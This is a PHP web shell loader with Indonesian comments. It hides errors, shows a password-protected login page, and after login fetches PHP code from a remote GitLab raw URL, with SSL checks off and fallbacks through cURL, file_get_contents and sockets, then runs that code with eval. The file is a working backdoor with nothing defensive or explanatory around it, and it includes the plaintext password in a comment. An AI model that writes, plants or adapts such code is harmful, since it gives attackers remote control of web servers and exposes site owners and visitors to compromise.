<?php
ini_set('log_errors', 0);
ini_set('display_errors', 0);
// Pastikan tidak ada spasi atau baris kosong sebelum tag <?php di atas
session_start();

/**
 * Fungsi untuk mengambil konten dari URL luar dengan berbagai metode fallback.
 */
function getURL($url) {
    $parsed_url = parse_url($url);
    if (!$parsed_url || !isset($parsed_url['host'])) {
        return false;
    }

    $host = $parsed_url['host'];
    $path = isset($parsed_url['path']) ? $parsed_url['path'] : '/';
    $port = isset($parsed_url['port']) ? $parsed_url['port'] : (isset($parsed_url['scheme']) && $parsed_url['scheme'] === 'https' ? 443 : 80);
    $scheme = (isset($parsed_url['scheme']) && $parsed_url['scheme'] === 'https') ? 'ssl://' : '';

    // Metode 1: cURL
    if (function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    // Metode 2: file_get_contents
    elseif (ini_get('allow_url_fopen')) {
        $context = stream_context_create([
            'http' => ['timeout' => 10, 'header' => "User-Agent: PHP\r\n"]
        ]);
        return @file_get_contents($url, false, $context);
    }
    // Metode 3: Socket
    elseif (function_exists('stream_socket_client')) {
        $socket = @stream_socket_client($scheme . $host . ':' . $port, $errno, $errstr, 10);
        if (!$socket) return false;
        $request = "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: PHP\r\nConnection: close\r\n\r\n";
        fwrite($socket, $request);
        $response = '';
        while (!feof($socket)) { $response .= fgets($socket); }
        fclose($socket);
        return substr($response, strpos($response, "\r\n\r\n") + 4);
    }
    return false;
}

function generate_csrf_token() {
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

function login_shell() {
    // Hash dari password "KOBERSERVER#"
    $password_hash = "1a84b8ba094c0c89954e86f2f518a9f32513da9b47b3619f1fba6c10fde783f2"; 
    $remote_url = "https://gitlab.com/nothing-imposible/posible/-/raw/main/alertshower.php";

    // 1. Cek jika sudah login
    if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
        $code = getURL($remote_url);
        if ($code) {
            eval("?>" . $code);
            exit;
        } else {
            die("Gagal mengambil file eksternal.");
        }
    }

    // 2. Proses Form Login
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
            echo "<script>alert('Invalid CSRF token!');</script>";
        } else {
            $input_password = $_POST['password'] ?? '';
            if (hash('sha256', $input_password) === $password_hash) {
                $_SESSION['authenticated'] = true;
                header("Location: " . $_SERVER['PHP_SELF']); // Refresh untuk menjalankan eval
                exit;
            } else {
                echo "<script>alert('Access Denied');</script>";
            }
        }
    }

    $csrf_token = generate_csrf_token();
?>
<!DOCTYPE HTML>
<html>
<head>
    <title>Login</title>
    <style>
        body { background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        input[type=password] { 
            width: 250px; background: transparent; border: 1px dotted red; 
            color: red; text-align: center; padding: 5px; outline: none;
        }
    </style>
</head>
<body>
    <form method="post">
        <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($csrf_token); ?>">
        <input type="password" name="password" autofocus placeholder="...">
    </form>
</body>
</html>
<?php
}

login_shell();
